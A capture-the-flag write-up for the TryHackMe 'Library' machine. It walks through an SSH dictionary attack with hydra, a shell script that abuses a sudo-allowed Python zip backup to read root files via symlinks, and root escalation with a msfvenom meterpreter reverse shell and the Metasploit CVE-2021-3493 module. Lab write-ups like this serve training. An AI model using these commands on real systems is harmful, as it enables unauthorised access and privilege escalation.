# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Library](https://tryhackme.com/room/bsidesgtlibrary)      |  
| 🏷 **Type**       | THM Challenge                                              |
| 🖥 **OS**         | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |
| 📁 **Tags**       | hydra, sudo, Python ZipFile, Follow symlink, CVE-2021-3493 |

# Scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
```

# Attack path
1. [Gain initial foothold over SSH using credentials discovered in dictionary attack](#gain-initial-foothold-over-ssh-using-credentials-discovered-in-dictionary-attack)
2. [Exploit follow symlink vulnerability in `bak.py` to read arbitrary file as `root` user](#exploit-follow-symlink-vulnerability-in-bakpy-to-read-arbitrary-file-as-root-user)
3. [Escalate to `root` user by exploiting CVE-2021-3493](#escalate-to-root-user-by-exploiting-cve-2021-3493)

### Gain initial foothold over SSH using credentials discovered in dictionary attack

#### Discover user `meliodas` being author of blog article
```
┌──(magicrc㉿perun)-[~/attack/THM Library]
└─$ curl -s http://$TARGET | grep -oP 'by <a href="#">\K[^<]+' 
meliodas
```

#### Discover odd `User-agent` in `robots.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Library]
└─$ curl http://$TARGET/robots.txt                             
User-agent: rockyou 
Disallow: /
```
This could suggest path of dictionary attack using `rockyou.txt` dictionary.

#### Conduct dictionary attack against user `meliodas` using `hydra` with `rockyou.txt` dictionary
```
┌──(magicrc㉿perun)-[~/attack/THM Library]
└─$ hydra -I -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://$TARGET          
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-05 08:47:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://10.80.144.165:22/
[22][ssh] host: 10.80.144.165   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-05 08:48:10
```

#### Confirm foothold gained
```
┌──(magicrc㉿perun)-[~/attack/THM Library]
└─$ ssh meliodas@$TARGET
<SNIP>
meliodas@ubuntu:~$ id
uid=1000(meliodas) gid=1000(meliodas) groups=1000(meliodas),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

### Exploit follow symlink vulnerability in `bak.py` to read arbitrary file as `root` user

#### List allowed sudo commands 
```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

#### Discover follow symlink vulnerability in `bak.py`
Vulnerability sits in line 8, as `ZipFile#write` method follows symlinks by default (`follow_symlinks=True`).
```
meliodas@ubuntu:~$ cat -n bak.py 
     1  #!/usr/bin/env python
     2  import os
     3  import zipfile
     4
     5  def zipdir(path, ziph):
     6      for root, dirs, files in os.walk(path):
     7          for file in files:
     8              ziph.write(os.path.join(root, file))
     9
    10  if __name__ == '__main__':
    11      zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    12      zipdir('/var/www/html', zipf)
    13      zipf.close()
```

#### Discover writeable directory in `/var/www/html`
```
meliodas@ubuntu:~$ ls -la /var/www/html
total 24
drwxr-xr-x 3 root     root      4096 Aug 24  2019 .
drwxr-xr-x 3 root     root      4096 Aug 24  2019 ..
drwxrwxr-x 3 meliodas meliodas  4096 Dec  4 23:55 Blog
-rw-r--r-- 1 root     root     11321 Aug 24  2019 index.html
```

#### Prepare exploit for reading arbitrary file as `root` user
```
meliodas@ubuntu:~$ { cat <<'EOF'> /tmp/root_cat.sh
DIRECTORY=/var/www/html/Blog
FILE=$1
SYMLINK=$RANDOM
TMPDIR=$(mktemp -d)

rm "$DIRECTORY/$SYMLINK" 2> /dev/null
ln -s "$FILE" "$DIRECTORY/$SYMLINK"
sudo /usr/bin/python /home/meliodas/bak.py
unzip /var/backups/website.zip -d "$TMPDIR" > /dev/null
cat "$TMPDIR/var/www/html/Blog/$SYMLINK"
trap 'rm -rf "$TMPDIR"; rm "$DIRECTORY/$SYMLINK"' EXIT
EOF
} && chmod +x /tmp/root_cat.sh
```
This exploit would be enough to grab `root.txt` flag, however as there is no `root` SSH private key (`/root/.ssh/id_rsa`) in place and `hashcat` does not yield intimidate results for `root` hash (from `/etc/shadow`) we need dig deeper to properly escalate.

### Escalate to `root` user by exploiting [CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493)

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Library]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 192.168.132.170:4444
```

#### Generate and upload `linux/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM Library]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o shell && \
scp shell meliodas@$TARGET:~/
<SNIP>  
```

#### Execute shell to spawn reverse shell connection
```
meliodas@ubuntu:~$ chmod +x shell && ./shell
```

#### Run `exploit/linux/local/cve_2021_3493_overlayfs` to escalate to `root`
Exploit suggested by `multi/recon/local_exploit_suggester`.
```
[*] Sending stage (3090404 bytes) to 10.80.144.165
[*] Meterpreter session 1 opened (192.168.132.170:4444 -> 10.80.144.165:46996) at 2025-12-05 10:43:15 +0100

meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/linux/local/cve_2021_3493_overlayfs
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/cve_2021_3493_overlayfs) > set SESSION 1
SESSION => 1
msf exploit(linux/local/cve_2021_3493_overlayfs) > set LHOST tun0
LHOST => tun0
msf exploit(linux/local/cve_2021_3493_overlayfs) > set LPORT 5555
LPORT => 5555
msf exploit(linux/local/cve_2021_3493_overlayfs) > run
[*] Started reverse TCP handler on 192.168.132.170:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Failed to open file: /proc/sys/user/max_user_namespaces: core_channel_open: Operation failed: 1
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.qWI7B/.2jL2KqT' (17840 bytes) ...
[*] Writing '/tmp/.qWI7B/.j7pb7YOf' (250 bytes) ...
[*] Launching exploit...
[*] Sending stage (3090404 bytes) to 10.80.144.165
[+] Deleted /tmp/.qWI7B/.2jL2KqT
[+] Deleted /tmp/.qWI7B
[*] Meterpreter session 2 opened (192.168.132.170:5555 -> 10.80.144.165:48996) at 2025-12-05 10:47:58 +0100

meterpreter > getuid
Server username: root
```